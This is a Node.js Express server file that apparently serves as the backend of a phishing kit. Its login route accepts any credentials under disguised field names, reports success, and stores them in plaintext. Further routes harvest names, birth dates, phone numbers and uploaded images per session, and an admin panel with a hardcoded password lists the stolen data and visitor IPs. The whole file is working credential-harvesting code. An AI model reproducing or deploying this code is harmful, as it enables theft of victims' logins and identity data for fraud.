const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Trust proxy for proper IP detection
app.set('trust proxy', true);

// Middleware
const corsOrigins = process.env.CORS_ORIGINS 
  ? process.env.CORS_ORIGINS.split(',').map(origin => origin.trim())
  : ['http://localhost:3000', 'http://localhost:3002'];

app.use(cors({
  origin: corsOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Accept-Language']
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Serve uploaded files
app.use('/uploads', express.static(uploadsDir));

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Accept only image files
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
});

// Simple admin authentication
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'COMMTAN@123';

// In-memory storage for demo purposes
let sessions = new Map();
let visitors = [];

// Routes
app.post('/api/login', async (req, res) => {
  const { xusr, xpss } = req.body;
  
  console.log('Login attempt:', { xusr, xpss });
  
  try {
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    sessions.set(sessionId, {
      sessionId,
      loginData: { xusr, xpss },
      ip,
      userAgent,
      createdAt: new Date()
    });
    
    res.json({ 
      success: true, 
      message: 'Login successful',
      sessionId: sessionId
    });
  } catch (error) {
    console.error('Error storing login data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/info', async (req, res) => {
  const { xname1, xname2, xdob, xtel, sessionId } = req.body;
  
  console.log('Info submission:', { xname1, xname2, xdob, xtel });
  
  try {
    const session = sessions.get(sessionId);
    if (session) {
      session.infoData = { xname1, xname2, xdob, xtel };
      sessions.set(sessionId, session);
    }
    
    res.json({ success: true, message: 'Info submitted successfully' });
  } catch (error) {
    console.error('Error storing info data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/upload', upload.single('file'), async (req, res) => {
  const file = req.file;
  const { sessionId } = req.body;
  const ip = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent');
  
  console.log('Upload request received:', { sessionId, file: file?.filename });
  
  try {
    const session = sessions.get(sessionId);
    if (session) {
      session.uploadData = {
        filename: file ? file.filename : null,
        originalName: file ? file.originalname : null,
        size: file ? file.size : 0,
        path: file ? file.path : null,
        mimeType: file ? file.mimetype : null
      };
      sessions.set(sessionId, session);
    }
    
    res.json({ success: true, message: 'File uploaded successfully' });
  } catch (error) {
    console.error('Error storing upload data:', error);
    res.status(500).json({ success: false, message: 'Error storing data: ' + error.message });
  }
});

app.post('/api/final', async (req, res) => {
  const { sessionId, ...data } = req.body;
  
  console.log('Final data submission:', data);
  
  try {
    const session = sessions.get(sessionId);
    if (session) {
      session.finalData = data;
      sessions.set(sessionId, session);
    }
    
    res.json({ success: true, message: 'Data submitted successfully' });
  } catch (error) {
    console.error('Error storing final data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

// Get collected data (for monitoring)
app.get('/api/data', async (req, res) => {
  try {
    const sessionArray = Array.from(sessions.values());
    res.json(sessionArray);
  } catch (error) {
    console.error('Error retrieving data:', error);
    res.status(500).json({ error: 'Error retrieving data' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Track website visits
app.post('/api/track-visit', async (req, res) => {
  try {
    const ip = req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    const path = req.body.path || '/';
    
    visitors.push({
      ip,
      userAgent,
      path,
      timestamp: new Date()
    });
    
    res.json({ success: true, message: 'Page visit tracked' });
  } catch (error) {
    console.error('Error tracking visit:', error);
    res.status(500).json({ success: false, message: 'Error tracking visit' });
  }
});

// Admin routes
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  const ip = req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress;
  
  console.log('Admin login attempt from IP:', ip);
  console.log('Received password:', password);
  console.log('Expected password:', ADMIN_PASSWORD);
  console.log('Passwords match:', password === ADMIN_PASSWORD);
  
  if (password === ADMIN_PASSWORD) {
    console.log('Admin login successful from IP:', ip);
    res.json({ success: true, message: 'Admin login successful' });
  } else {
    console.log('Failed admin login attempt from IP:', ip);
    res.status(401).json({ success: false, message: 'Invalid admin password' });
  }
});

app.get('/api/admin/user-data', async (req, res) => {
  try {
    const sessionArray = Array.from(sessions.values());
    res.json({
      success: true,
      data: sessionArray,
      total: sessionArray.length
    });
  } catch (error) {
    console.error('Error retrieving user data:', error);
    res.status(500).json({ success: false, error: 'Error retrieving data' });
  }
});

app.get('/api/admin/visitors', async (req, res) => {
  try {
    res.json({
      success: true,
      data: visitors.slice(-500), // Last 500 visitors
      total: visitors.length
    });
  } catch (error) {
    console.error('Error retrieving visitors:', error);
    res.status(500).json({ success: false, error: 'Error retrieving data' });
  }
});

app.get('/api/admin/stats', async (req, res) => {
  try {
    const sessionArray = Array.from(sessions.values());
    const stats = {
      totalSessions: sessionArray.length,
      completedSessions: sessionArray.filter(s => s.finalData).length,
      totalVisitors: visitors.length,
      uniqueIPs: new Set(visitors.map(v => v.ip)).size
    };
    
    res.json({
      success: true,
      stats: stats
    });
  } catch (error) {
    console.error('Error retrieving stats:', error);
    res.status(500).json({ success: false, error: 'Error retrieving stats' });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Error:', error);
  res.status(500).json({ error: error.message });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API endpoints available at http://localhost:${PORT}/api`);
  console.log(`Admin password: ${ADMIN_PASSWORD}`);
});
